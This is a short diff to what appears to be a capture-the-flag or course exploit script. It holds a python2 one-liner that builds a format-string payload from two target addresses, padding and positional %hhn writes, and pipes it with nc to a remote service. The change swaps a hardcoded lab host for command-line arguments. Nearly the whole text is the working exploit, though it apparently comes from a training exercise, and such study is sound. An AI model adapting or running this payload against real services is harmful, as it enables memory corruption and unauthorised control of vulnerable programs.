@@ -11,4 +11,4 @@
 # 0x85 - 8 = 125//first padding
 # 0xcb - 0x85 = 70//second padding
 
-python2 -c 'print "\x28\xa0\x04\x08\x29\xa0\x04\x08%.125x%5$hhn%.70x%4$hhn"' | nc lse.epita.fr 52129
+python2 -c 'print "\x28\xa0\x04\x08\x29\xa0\x04\x08%.125x%5$hhn%.70x%4$hhn"' |  nc $1 $2
